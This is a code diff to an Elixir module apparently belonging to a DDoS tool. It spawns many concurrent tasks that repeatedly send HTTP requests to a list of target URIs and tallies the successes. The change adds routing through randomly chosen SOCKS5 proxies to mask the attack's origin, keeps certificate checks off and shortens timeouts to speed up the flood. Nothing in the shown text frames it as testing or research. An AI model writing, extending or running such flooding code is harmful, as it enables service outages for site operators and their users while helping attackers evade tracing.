@@ -24,17 +24,25 @@ defmodule Ddos.GenServesr.Ddos do
 
     defp start(threads \\ DdosConfig.get_threads()) do
         uries = DdosConfig.get_uries()
+        use_proxy = DdosConfig.get_use_proxy()
+        {host, port} = DdosConfig.get_random_proxy()
 
         Enum.each(1..threads, fn _thread -> 
             Task.Supervisor.start_child(
                 Ddos.TaskSupervisor, 
                 fn -> 
                     Enum.each(uries, fn uri -> 
-                        case HTTPoison.get(uri, [], [ssh: [verify: :verify_none], hackney: [pool: :ddos, recv_timeout: 15_000]]) do
-                            {:ok, body} = response -> 
+                        response = 
+                            if use_proxy === false do
+                                HTTPoison.get(uri, [], [ssl: [verify: :verify_none], hackney: [pool: :ddos], timeout: 5_000, recv_timeout: 5_000])
+                            else
+                                HTTPoison.get(uri, [], [ssl: [verify: :verify_none], hackney: [pool: :ddos], proxy: {:socks5, host, port}, timeout: 5_000, recv_timeout: 5_000])
+                            end
+
+                        case response do
+                            {:ok, body} -> 
                                 RequestsCache.increment_success_requests_counter()
-                                IO.inspect(body)
-                            response ->
+                            _response ->
                                 RequestsCache.increment_requests_counter()
                         end
                     end)
